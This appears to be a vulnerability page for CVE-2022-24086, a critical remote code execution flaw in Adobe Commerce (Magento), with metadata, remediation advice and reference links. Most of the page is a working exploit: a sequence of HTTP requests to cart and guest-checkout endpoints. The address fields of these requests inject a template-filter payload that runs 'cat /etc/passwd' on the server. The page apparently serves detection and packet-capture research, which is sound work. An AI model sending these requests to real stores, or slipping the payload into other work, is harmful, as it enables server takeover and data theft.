---
layout: post
cve_id: CVE-2022-24086
title: Adobe Commerce (Magento) - Remote Code Execution
pcap: true
pcap_path: /pcaps/2022/CVE-2022-24086.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-24086.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: critical
impact: 'Attackers can execute arbitrary code on the server, potentially leading to
  full system compromise.

  '
remediation: 'Update to the latest version of Adobe Commerce that addresses this vulnerability.

  '
reference:
- https://helpx.adobe.com/security/products/magento/apsb22-12.html
- https://vovohelo.medium.com/reversing-a-magento-rce-cve-2022-24086-e991ead4d8af
- https://labs.watchtowr.com/adobe-commerce-magento-rce-cve-2022-24086/
- https://nvd.nist.gov/vuln/detail/CVE-2022-24086
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-24086
  epss-score: 0.93778
  epss-percentile: 0.99844
  cwe-id: CWE-20
  cpe: cpe:2.3:a:adobe:commerce:*:*:*:*:*:*:*:*
metadata:
  verified: true
  vendor: adobe
  product: commerce
  shodan-query: X-Magento-Tags
tags:
- cve
- cve2022
- adobe
- magento
- commerce
- rce
- intrusive
- kev
- vkev
---

## üîç Vulnerability Description
Adobe Commerce versions 2.4.3-p1 (and earlier) and 2.3.7-p2 (and earlier) are affected by an improper input validation vulnerability during the checkout process. Exploitation of this issue does not require user interaction and could result in arbitrary code execution.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1

Host: www.victim.com

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0

Connection: close

Accept: */*

Accept-Language: en

Accept-Encoding: gzip
```

```nohighlight
POST /checkout/cart/add/uenc/aHR0cDovL3d3dy52aWN0aW0uY29t%2C/product/0rq1Q9/ HTTP/1.1

Host: www.victim.com

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15

Connection: close

Content-Length: 342

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2gMM6E6ZIRMtnlg4

Cookie: form_key=nBqJuo

X-Requested-With: XMLHttpRequest

Accept-Encoding: gzip



------WebKitFormBoundary2gMM6E6ZIRMtnlg4

Content-Disposition: form-data; name="product"



0rq1Q9

------WebKitFormBoundary2gMM6E6ZIRMtnlg4

Content-Disposition: form-data; name="item"



0rq1Q9

------WebKitFormBoundary2gMM6E6ZIRMtnlg4

Content-Disposition: form-data; name="form_key"



nBqJuo

------WebKitFormBoundary2gMM6E6ZIRMtnlg4--
```

```nohighlight
GET /checkout HTTP/1.1

Host: www.victim.com

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.1

Connection: close

Accept-Encoding: gzip
```

```nohighlight
POST /rest/default/V1/guest-carts/7z9WWJ/shipping-information HTTP/1.1

Host: www.victim.com

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:6.0; vi-VN) AppleWebKit/535.6.1 (KHTML, like Gecko) Version/4.1 Safari/535.6.1

Connection: close

Content-Length: 789

Content-Type: application/json

Accept-Encoding: gzip



{"addressInformation":{"shipping_address":{"countryId":"FR","regionCode":"","region":"","street":["bacbc"],"company":"","telephone":"96057","postcode":"12311","city":"bacbc","firstname":"\{\{var this.getTemplateFilter().filter(foobar)}}\{\{var this.getTemplateFilter().addAfterFilterCallback(system).filter(cat$IFS/etc/passwd)}}","lastname":"bacbc"},"billing_address":{"countryId":"FR","regionCode":"","region":"","street":["bacbc"],"company":"","telephone":"96057","postcode":"12311","city":"bacbc","firstname":"\{\{var this.getTemplateFilter().filter(foobar)}}\{\{var this.getTemplateFilter().addAfterFilterCallback(system).filter(cat$IFS/etc/passwd)}}","lastname":"bacbc","saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{}}}
```

```nohighlight
POST /rest/default/V1/guest-carts/7z9WWJ/payment-information HTTP/1.1

Host: www.victim.com

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1

Connection: close

Content-Length: 469

Content-Type: application/json

Accept-Encoding: gzip



{"cartId":"7z9WWJ","billingAddress":{"countryId":"FR","regionCode":"","region":"","street":["bacbc"],"company":"","telephone":"96057","postcode":"12311","city":"bacbc","firstname":"\{\{var this.getTemplateFilter().filter(foobar)}}\{\{var this.getTemplateFilter().addAfterFilterCallback(system).filter(cat$IFS/etc/passwd)}}","lastname":"bacbc","saveInAddressBook":null},"paymentMethod":{"method":"checkmo","po_number":null,"additional_data":null},"email":"uVqBhy@ECrYt.com"}
```


